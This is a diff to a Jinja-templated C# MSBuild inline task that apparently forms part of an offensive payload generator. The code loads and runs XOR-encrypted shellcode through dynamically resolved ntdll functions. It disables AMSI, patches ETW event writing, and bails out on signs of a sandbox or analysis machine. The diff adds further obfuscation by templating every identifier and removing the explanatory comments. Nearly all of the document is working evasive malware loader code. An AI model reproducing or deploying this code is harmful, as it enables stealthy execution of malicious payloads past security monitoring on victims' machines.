@@ -27,39 +27,37 @@
 
         public class {{ v.task_name }} : Task, ITask {
 
-            // Dynamic NtDll delegates — no DllImport strings in assembly metadata
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            private delegate int NtAllocFn(IntPtr ph, ref IntPtr ba, IntPtr zb, ref IntPtr rs, uint at, uint prot);
+            private delegate int {{ v.del_nt_alloc }}(IntPtr ph, ref IntPtr ba, IntPtr zb, ref IntPtr rs, uint at, uint prot);
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            private delegate int NtProtFn(IntPtr ph, ref IntPtr ba, ref IntPtr sz, uint np, out uint op);
+            private delegate int {{ v.del_nt_prot }}(IntPtr ph, ref IntPtr ba, ref IntPtr sz, uint np, out uint op);
 
-            static string B(int[] c) {
-                var sb = new System.Text.StringBuilder();
-                foreach (var x in c) sb.Append((char)x);
-                return sb.ToString();
+            static string {{ v.mb_fn_b }}(int[] c) {
+                var {{ v.mb_lv_b_sb }} = new System.Text.StringBuilder();
+                foreach (var {{ v.mb_lv_b_x }} in c) {{ v.mb_lv_b_sb }}.Append((char){{ v.mb_lv_b_x }});
+                return {{ v.mb_lv_b_sb }}.ToString();
             }
 
-            static byte[] N(int[] c) { var b=new byte[c.Length+1]; for(int i=0;i<c.Length;i++) b[i]=(byte)c[i]; return b; }
+            static byte[] {{ v.mb_fn_n }}(int[] c) { var {{ v.mb_lv_n_b }}=new byte[c.Length+1]; for(int {{ v.mb_lv_n_i }}=0;{{ v.mb_lv_n_i }}<c.Length;{{ v.mb_lv_n_i }}++) {{ v.mb_lv_n_b }}[{{ v.mb_lv_n_i }}]=(byte)c[{{ v.mb_lv_n_i }}]; return {{ v.mb_lv_n_b }}; }
 
-            // Walk PE export table by name bytes — no plaintext function name strings.
             static IntPtr {{ v.fn_getexport }}(IntPtr mod, byte[] name) {
                 try {
-                    int peo    = Marshal.ReadInt32(mod, 0x3C);
-                    int exprva = Marshal.ReadInt32(IntPtr.Add(mod, peo + 0x88));
-                    if (exprva == 0) return IntPtr.Zero;
-                    IntPtr ed  = IntPtr.Add(mod, exprva);
-                    int nn   = Marshal.ReadInt32(ed, 0x18);
-                    int nrva = Marshal.ReadInt32(ed, 0x20);
-                    int orva = Marshal.ReadInt32(ed, 0x24);
-                    int frva = Marshal.ReadInt32(ed, 0x1C);
-                    for (int i = 0; i < nn; i++) {
-                        IntPtr np = IntPtr.Add(mod, Marshal.ReadInt32(IntPtr.Add(mod, nrva + i*4)));
-                        bool ok = true;
-                        for (int j = 0; j < name.Length; j++)
-                            if (Marshal.ReadByte(IntPtr.Add(np, j)) != name[j]) { ok = false; break; }
-                        if (!ok) continue;
-                        short ord = Marshal.ReadInt16(IntPtr.Add(mod, orva + i*2));
-                        return IntPtr.Add(mod, Marshal.ReadInt32(IntPtr.Add(mod, frva + ord*4)));
+                    int {{ v.mb_lv_ge_peo }}    = Marshal.ReadInt32(mod, 0x3C);
+                    int {{ v.mb_lv_ge_exprva }} = Marshal.ReadInt32(IntPtr.Add(mod, {{ v.mb_lv_ge_peo }} + 0x88));
+                    if ({{ v.mb_lv_ge_exprva }} == 0) return IntPtr.Zero;
+                    IntPtr {{ v.mb_lv_ge_ed }}  = IntPtr.Add(mod, {{ v.mb_lv_ge_exprva }});
+                    int {{ v.mb_lv_ge_nn }}   = Marshal.ReadInt32({{ v.mb_lv_ge_ed }}, 0x18);
+                    int {{ v.mb_lv_ge_nrva }} = Marshal.ReadInt32({{ v.mb_lv_ge_ed }}, 0x20);
+                    int {{ v.mb_lv_ge_orva }} = Marshal.ReadInt32({{ v.mb_lv_ge_ed }}, 0x24);
+                    int {{ v.mb_lv_ge_frva }} = Marshal.ReadInt32({{ v.mb_lv_ge_ed }}, 0x1C);
+                    for (int {{ v.mb_lv_ge_i }} = 0; {{ v.mb_lv_ge_i }} < {{ v.mb_lv_ge_nn }}; {{ v.mb_lv_ge_i }}++) {
+                        IntPtr {{ v.mb_lv_ge_np }} = IntPtr.Add(mod, Marshal.ReadInt32(IntPtr.Add(mod, {{ v.mb_lv_ge_nrva }} + {{ v.mb_lv_ge_i }}*4)));
+                        bool {{ v.mb_lv_ge_ok }} = true;
+                        for (int {{ v.mb_lv_ge_j }} = 0; {{ v.mb_lv_ge_j }} < name.Length; {{ v.mb_lv_ge_j }}++)
+                            if (Marshal.ReadByte(IntPtr.Add({{ v.mb_lv_ge_np }}, {{ v.mb_lv_ge_j }})) != name[{{ v.mb_lv_ge_j }}]) { {{ v.mb_lv_ge_ok }} = false; break; }
+                        if (!{{ v.mb_lv_ge_ok }}) continue;
+                        short {{ v.mb_lv_ge_ord }} = Marshal.ReadInt16(IntPtr.Add(mod, {{ v.mb_lv_ge_orva }} + {{ v.mb_lv_ge_i }}*2));
+                        return IntPtr.Add(mod, Marshal.ReadInt32(IntPtr.Add(mod, {{ v.mb_lv_ge_frva }} + {{ v.mb_lv_ge_ord }}*4)));
                     }
                 } catch {}
                 return IntPtr.Zero;
@@ -67,109 +65,108 @@
 
             static void {{ v.fn_amsi }}() {
                 try {
-                    var t = Type.GetType(B(new int[]{ {{ v.jsc_auto_amsi_utils }} }));
-                    if (t != null) {
-                        var f = t.GetField(B(new int[]{ {{ v.jsc_amsi_init_fail }} }),
+                    var {{ v.mb_lv_am_t }} = Type.GetType({{ v.mb_fn_b }}(new int[]{ {{ v.jsc_auto_amsi_utils }} }));
+                    if ({{ v.mb_lv_am_t }} != null) {
+                        var {{ v.mb_lv_am_f }} = {{ v.mb_lv_am_t }}.GetField({{ v.mb_fn_b }}(new int[]{ {{ v.jsc_amsi_init_fail }} }),
                             BindingFlags.NonPublic | BindingFlags.Static);
-                        if (f != null) f.SetValue(null, true);
+                        if ({{ v.mb_lv_am_f }} != null) {{ v.mb_lv_am_f }}.SetValue(null, true);
                     }
                 } catch {}
             }
 
             static void {{ v.fn_etw }}(IntPtr ntdll) {
                 try {
-                    byte[] tgt = N(new int[]{ {{ v.jsc_etw_event_write }} });
-                    IntPtr fn  = {{ v.fn_getexport }}(ntdll, tgt);
-                    if (fn == IntPtr.Zero) return;
-                    byte[] protN = N(new int[]{ {{ v.jsc_nt_prot_vm }} });
-                    IntPtr protAddr = {{ v.fn_getexport }}(ntdll, protN);
-                    if (protAddr == IntPtr.Zero) return;
-                    var NtProt = (NtProtFn)Marshal.GetDelegateForFunctionPointer(protAddr, typeof(NtProtFn));
-                    IntPtr ph = (IntPtr)(-1);
-                    IntPtr ba = fn; IntPtr sz = (IntPtr)3; uint old;
-                    NtProt(ph, ref ba, ref sz, 0x40, out old);
-                    Marshal.WriteByte(fn, 0, 0x33);
-                    Marshal.WriteByte(fn, 1, 0xC0);
-                    Marshal.WriteByte(fn, 2, 0xC3);
-                    IntPtr ba2 = fn; IntPtr sz2 = (IntPtr)3;
-                    NtProt(ph, ref ba2, ref sz2, old, out old);
+                    byte[] {{ v.mb_lv_ew_tgt }} = {{ v.mb_fn_n }}(new int[]{ {{ v.jsc_etw_event_write }} });
+                    IntPtr {{ v.mb_lv_ew_fn }}  = {{ v.fn_getexport }}(ntdll, {{ v.mb_lv_ew_tgt }});
+                    if ({{ v.mb_lv_ew_fn }} == IntPtr.Zero) return;
+                    byte[] {{ v.mb_lv_ew_protn }} = {{ v.mb_fn_n }}(new int[]{ {{ v.jsc_nt_prot_vm }} });
+                    IntPtr {{ v.mb_lv_ew_protaddr }} = {{ v.fn_getexport }}(ntdll, {{ v.mb_lv_ew_protn }});
+                    if ({{ v.mb_lv_ew_protaddr }} == IntPtr.Zero) return;
+                    var {{ v.mb_lv_ew_ntprot }} = ({{ v.del_nt_prot }})Marshal.GetDelegateForFunctionPointer({{ v.mb_lv_ew_protaddr }}, typeof({{ v.del_nt_prot }}));
+                    IntPtr {{ v.mb_lv_ew_ph }} = (IntPtr)(-1);
+                    IntPtr {{ v.mb_lv_ew_ba }} = {{ v.mb_lv_ew_fn }}; IntPtr {{ v.mb_lv_ew_sz }} = (IntPtr)3; uint {{ v.mb_lv_ew_old }};
+                    {{ v.mb_lv_ew_ntprot }}({{ v.mb_lv_ew_ph }}, ref {{ v.mb_lv_ew_ba }}, ref {{ v.mb_lv_ew_sz }}, 0x40, out {{ v.mb_lv_ew_old }});
+                    Marshal.WriteByte({{ v.mb_lv_ew_fn }}, 0, 0x33);
+                    Marshal.WriteByte({{ v.mb_lv_ew_fn }}, 1, 0xC0);
+                    Marshal.WriteByte({{ v.mb_lv_ew_fn }}, 2, 0xC3);
+                    IntPtr {{ v.mb_lv_ew_ba2 }} = {{ v.mb_lv_ew_fn }}; IntPtr {{ v.mb_lv_ew_sz2 }} = (IntPtr)3;
+                    {{ v.mb_lv_ew_ntprot }}({{ v.mb_lv_ew_ph }}, ref {{ v.mb_lv_ew_ba2 }}, ref {{ v.mb_lv_ew_sz2 }}, {{ v.mb_lv_ew_old }}, out {{ v.mb_lv_ew_old }});
                 } catch {}
             }
 
             static bool {{ v.fn_sandbox }}() {
                 try {
-                    string u = Environment.UserName.ToLower();
-                    string[] badU = new string[]{B(new int[]{115,97,110,100,98,111,120}),B(new int[]{109,97,108,116,101,115,116}),B(new int[]{118,105,114,117,115}),B(new int[]{99,117,99,107,111,111}),B(new int[]{117,115,101,114}),B(new int[]{116,101,115,116})};
-                    foreach (var b in badU) if (u == b) return true;
-                    var di = new System.IO.DriveInfo("C");
-                    if (di.TotalSize < 53687091200L) return true;
-                    string cn = Environment.MachineName.ToLower();
-                    if (cn.Contains(B(new int[]{115,97,110,100,98,111,120}))) return true;
-                    if (cn.Contains(B(new int[]{97,110,97,108,121,115,105,115}))) return true;
-                    if (Environment.GetEnvironmentVariable(B(new int[]{ {{ v.jsc_env_vbox }} })) != null) return true;
-                    if (Environment.GetEnvironmentVariable(B(new int[]{ {{ v.jsc_env_sandboxie }} })) != null) return true;
+                    string {{ v.mb_lv_sb_u }} = Environment.UserName.ToLower();
+                    string[] {{ v.mb_lv_sb_badu }} = new string[]{ {{ v.mb_fn_b }}(new int[]{115,97,110,100,98,111,120}),{{ v.mb_fn_b }}(new int[]{109,97,108,116,101,115,116}),{{ v.mb_fn_b }}(new int[]{118,105,114,117,115}),{{ v.mb_fn_b }}(new int[]{99,117,99,107,111,111}),{{ v.mb_fn_b }}(new int[]{117,115,101,114}),{{ v.mb_fn_b }}(new int[]{116,101,115,116}) };
+                    foreach (var {{ v.mb_lv_sb_b }} in {{ v.mb_lv_sb_badu }}) if ({{ v.mb_lv_sb_u }} == {{ v.mb_lv_sb_b }}) return true;
+                    var {{ v.mb_lv_sb_di }} = new System.IO.DriveInfo("C");
+                    if ({{ v.mb_lv_sb_di }}.TotalSize < 53687091200L) return true;
+                    string {{ v.mb_lv_sb_cn }} = Environment.MachineName.ToLower();
+                    if ({{ v.mb_lv_sb_cn }}.Contains({{ v.mb_fn_b }}(new int[]{115,97,110,100,98,111,120}))) return true;
+                    if ({{ v.mb_lv_sb_cn }}.Contains({{ v.mb_fn_b }}(new int[]{97,110,97,108,121,115,105,115}))) return true;
+                    if (Environment.GetEnvironmentVariable({{ v.mb_fn_b }}(new int[]{ {{ v.jsc_env_vbox }} })) != null) return true;
+                    if (Environment.GetEnvironmentVariable({{ v.mb_fn_b }}(new int[]{ {{ v.jsc_env_sandboxie }} })) != null) return true;
                 } catch {}
                 return false;
             }
 
             static byte[] {{ v.fn_decrypt }}(byte[] data, byte[] key) {
-                var o = new byte[data.Length];
-                for (int i = 0; i < data.Length; i++) o[i] = (byte)(data[i] ^ key[i % key.Length]);
-                return o;
+                var {{ v.mb_lv_dc_o }} = new byte[data.Length];
+                for (int {{ v.mb_lv_dc_i }} = 0; {{ v.mb_lv_dc_i }} < data.Length; {{ v.mb_lv_dc_i }}++) {{ v.mb_lv_dc_o }}[{{ v.mb_lv_dc_i }}] = (byte)(data[{{ v.mb_lv_dc_i }}] ^ key[{{ v.mb_lv_dc_i }} % key.Length]);
+                return {{ v.mb_lv_dc_o }};
             }
 
             static byte[] {{ v.fn_hex }}(string h) {
-                var b = new byte[h.Length / 2];
-                for (int i = 0; i < b.Length; i++)
-                    b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
-                return b;
+                var {{ v.mb_lv_hx_b }} = new byte[h.Length / 2];
+                for (int {{ v.mb_lv_hx_i }} = 0; {{ v.mb_lv_hx_i }} < {{ v.mb_lv_hx_b }}.Length; {{ v.mb_lv_hx_i }}++)
+                    {{ v.mb_lv_hx_b }}[{{ v.mb_lv_hx_i }}] = Convert.ToByte(h.Substring({{ v.mb_lv_hx_i }} * 2, 2), 16);
+                return {{ v.mb_lv_hx_b }};
             }
 
             public override bool Execute() {
                 if ({{ v.fn_sandbox }}()) return false;
 
-                // Resolve ntdll from loaded modules (no GetModuleHandle string in IAT)
-                IntPtr ntdll = IntPtr.Zero;
-                foreach (System.Diagnostics.ProcessModule m in
+                IntPtr {{ v.mb_lv_ex_ntdll }} = IntPtr.Zero;
+                foreach (System.Diagnostics.ProcessModule {{ v.mb_lv_ex_m }} in
                          System.Diagnostics.Process.GetCurrentProcess().Modules)
-                    if (m.ModuleName.ToLower() == B(new int[]{ {{ v.jsc_ntdll_dll }} })) {
-                        ntdll = m.BaseAddress; break;
+                    if ({{ v.mb_lv_ex_m }}.ModuleName.ToLower() == {{ v.mb_fn_b }}(new int[]{ {{ v.jsc_ntdll_dll }} })) {
+                        {{ v.mb_lv_ex_ntdll }} = {{ v.mb_lv_ex_m }}.BaseAddress; break;
                     }
-                if (ntdll == IntPtr.Zero) return false;
+                if ({{ v.mb_lv_ex_ntdll }} == IntPtr.Zero) return false;
 
                 {{ v.fn_amsi }}();
-                {{ v.fn_etw }}(ntdll);
+                {{ v.fn_etw }}({{ v.mb_lv_ex_ntdll }});
                 Thread.Sleep(2000 + new Random().Next(3000));
 
-                byte[] _k = {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
-                for (int _ki = 0; _ki < _k.Length; _ki++) _k[_ki] ^= (byte){{ key_tweak }};
-                byte[] sc = {{ v.fn_decrypt }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), _k);
+                byte[] {{ v.mb_lv_ex_k }} = {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
+                for (int {{ v.mb_lv_ex_ki }} = 0; {{ v.mb_lv_ex_ki }} < {{ v.mb_lv_ex_k }}.Length; {{ v.mb_lv_ex_ki }}++) {{ v.mb_lv_ex_k }}[{{ v.mb_lv_ex_ki }}] ^= (byte){{ key_tweak }};
+                byte[] {{ v.mb_lv_ex_sc }} = {{ v.fn_decrypt }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), {{ v.mb_lv_ex_k }});
 
-                byte[] allocN = N(new int[]{ {{ v.jsc_nt_alloc_vm }} });
-                byte[] protN  = N(new int[]{ {{ v.jsc_nt_prot_vm }} });
-                IntPtr allocAddr = {{ v.fn_getexport }}(ntdll, allocN);
-                IntPtr protAddr  = {{ v.fn_getexport }}(ntdll, protN);
-                if (allocAddr == IntPtr.Zero || protAddr == IntPtr.Zero) return false;
+                byte[] {{ v.mb_lv_ex_allocn }} = {{ v.mb_fn_n }}(new int[]{ {{ v.jsc_nt_alloc_vm }} });
+                byte[] {{ v.mb_lv_ex_protn }}  = {{ v.mb_fn_n }}(new int[]{ {{ v.jsc_nt_prot_vm }} });
+                IntPtr {{ v.mb_lv_ex_allocaddr }} = {{ v.fn_getexport }}({{ v.mb_lv_ex_ntdll }}, {{ v.mb_lv_ex_allocn }});
+                IntPtr {{ v.mb_lv_ex_protaddr }}  = {{ v.fn_getexport }}({{ v.mb_lv_ex_ntdll }}, {{ v.mb_lv_ex_protn }});
+                if ({{ v.mb_lv_ex_allocaddr }} == IntPtr.Zero || {{ v.mb_lv_ex_protaddr }} == IntPtr.Zero) return false;
 
-                var NtAlloc = (NtAllocFn)Marshal.GetDelegateForFunctionPointer(allocAddr, typeof(NtAllocFn));
-                var NtProt  = (NtProtFn )Marshal.GetDelegateForFunctionPointer(protAddr,  typeof(NtProtFn));
+                var {{ v.fn_nt_alloc }} = ({{ v.del_nt_alloc }})Marshal.GetDelegateForFunctionPointer({{ v.mb_lv_ex_allocaddr }}, typeof({{ v.del_nt_alloc }}));
+                var {{ v.fn_nt_prot }}  = ({{ v.del_nt_prot }})Marshal.GetDelegateForFunctionPointer({{ v.mb_lv_ex_protaddr }},  typeof({{ v.del_nt_prot }}));
 
-                IntPtr ph  = (IntPtr)(-1);
-                IntPtr mem = IntPtr.Zero;
-                IntPtr rsz = (IntPtr)sc.Length;
-                if (NtAlloc(ph, ref mem, IntPtr.Zero, ref rsz, 0x3000, 0x04) != 0 || mem == IntPtr.Zero) return false;
-                Marshal.Copy(sc, 0, mem, sc.Length);
-                IntPtr psz = (IntPtr)sc.Length;
-                uint oldProt;
-                NtProt(ph, ref mem, ref psz, 0x20, out oldProt);
+                IntPtr {{ v.mb_lv_ex_ph }}  = (IntPtr)(-1);
+                IntPtr {{ v.mb_lv_ex_mem }} = IntPtr.Zero;
+                IntPtr {{ v.mb_lv_ex_rsz }} = (IntPtr){{ v.mb_lv_ex_sc }}.Length;
+                if ({{ v.fn_nt_alloc }}({{ v.mb_lv_ex_ph }}, ref {{ v.mb_lv_ex_mem }}, IntPtr.Zero, ref {{ v.mb_lv_ex_rsz }}, 0x3000, 0x04) != 0 || {{ v.mb_lv_ex_mem }} == IntPtr.Zero) return false;
+                Marshal.Copy({{ v.mb_lv_ex_sc }}, 0, {{ v.mb_lv_ex_mem }}, {{ v.mb_lv_ex_sc }}.Length);
+                IntPtr {{ v.mb_lv_ex_psz }} = (IntPtr){{ v.mb_lv_ex_sc }}.Length;
+                uint {{ v.mb_lv_ex_oldprot }};
+                {{ v.fn_nt_prot }}({{ v.mb_lv_ex_ph }}, ref {{ v.mb_lv_ex_mem }}, ref {{ v.mb_lv_ex_psz }}, 0x20, out {{ v.mb_lv_ex_oldprot }});
 
-                var fn_thread = new Thread(() => {
-                    var fn = (Action)Marshal.GetDelegateForFunctionPointer(mem, typeof(Action));
-                    fn();
+                var {{ v.mb_lv_ex_fnthread }} = new Thread(() => {
+                    var {{ v.mb_lv_ex_fn }} = (Action)Marshal.GetDelegateForFunctionPointer({{ v.mb_lv_ex_mem }}, typeof(Action));
+                    {{ v.mb_lv_ex_fn }}();
                 });
-                fn_thread.IsBackground = true;
-                fn_thread.Start();
-                fn_thread.Join();
+                {{ v.mb_lv_ex_fnthread }}.IsBackground = true;
+                {{ v.mb_lv_ex_fnthread }}.Start();
+                {{ v.mb_lv_ex_fnthread }}.Join();
                 return true;
             }
         }
